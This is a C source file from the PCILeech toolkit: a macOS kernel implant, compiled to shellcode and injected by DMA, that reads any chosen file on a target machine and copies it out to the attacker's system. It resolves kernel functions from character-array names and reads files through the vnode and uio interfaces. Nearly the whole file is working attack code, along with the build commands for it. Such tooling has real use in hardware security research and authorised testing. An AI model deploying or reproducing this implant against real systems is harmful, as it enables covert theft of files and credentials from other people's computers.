// macos_filepull.c : kernel code to pull files from target system.
// Compatible with Apple macOS.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// Inspired by: http://www.phrack.org/papers/revisiting-mac-os-x-kernel-rootkits.html
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_filepull.c
// ml64.exe macos_common_a.asm /Femacos_filepull.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main macos_filepull.obj macos_common.obj
// shellcode64.exe -o macos_filepull.exe "PULL FILES FROM TARGET SYSTEM                                  \nAPPLE macOS EDITION                                            \n===============================================================\nPull a file from the target system to the local system.        \nREQUIRED OPTIONS:                                              \n  -out : file on local system to write result to.              \n         filename is given in normal format.                   \n         Example: '-out c:\temp\hosts'                         \n  -s : file on target system.                                  \n         Example: '-s /etc/hosts'                              \n===== PULL ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\n===============================================================\n"
//
#include "macos_common.h"

typedef struct tdFN2 {
	QWORD vnode_lookup;
	QWORD vnode_put;
	QWORD VNOP_READ;
	QWORD uio_addiov;
	QWORD uio_resid;
	QWORD vfs_context_current;
	QWORD uio_create;
	QWORD uio_free;
} FN2, *PFN2;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD i = 0, NAMES[sizeof(FN2) / sizeof(QWORD)], *pfn_qw = (PQWORD)pfn2;
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'l', 'o', 'o', 'k', 'u', 'p', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'p', 'u', 't', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'R', 'E', 'A', 'D', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'a', 'd', 'd', 'i', 'o', 'v', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'r', 'e', 's', 'i', 'd', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'f', 's', '_', 'c', 'o', 'n', 't', 'e', 'x', 't', '_', 'c', 'u', 'r', 'r', 'e', 'n', 't', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'c', 'r', 'e', 'a', 't', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'f', 'r', 'e', 'e', 0 };
	for(i = 0; i < sizeof(FN2) / sizeof(QWORD); i++) {
		pfn_qw[i] = LookupFunctionMacOS(pk->AddrKernelBase, (CHAR*)NAMES[i]);
		if(!pfn_qw[i]) { return FALSE; }
	}
	return TRUE;
}

VOID c_EntryPoint(PKMDDATA pk)
{
	FN2 fn2;
	DWORD status = 0;
	QWORD uio = 0, vnode = 0, vfs_current;
	if(!pk->dataInStr[0]) {
		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
		return;
	}
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	SysVCall(pk->fn.memcpy, pk->dataOutStr, pk->dataInStr, MAX_PATH);
	vfs_current = SysVCall(fn2.vfs_context_current);
	if(SysVCall(fn2.vnode_lookup, pk->dataInStr, 0, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}
	uio = SysVCall(fn2.uio_create, 1 /* count iov */, 0 /* offset */, 2 /* kernel addr */, 0 /* read */);
	if(SysVCall(fn2.uio_addiov, uio, pk->DMAAddrVirtual + pk->dataOutExtraOffset, pk->dataOutExtraLengthMax)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}
	if(SysVCall(fn2.VNOP_READ, vnode, uio, 0, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}
	pk->dataOutExtraLength = pk->dataOutExtraLengthMax - SysVCall(fn2.uio_resid, uio);
	if(pk->dataOutExtraLength == pk->dataOutExtraLengthMax) {
		status = STATUS_FAIL_FILE_SIZE;
		goto error;
	}
error:
	if(uio) {
		SysVCall(fn2.uio_free, uio);
	}
	if(vnode) {
		SysVCall(fn2.vnode_put, vnode);
	}
	pk->dataOut[0] = status;
}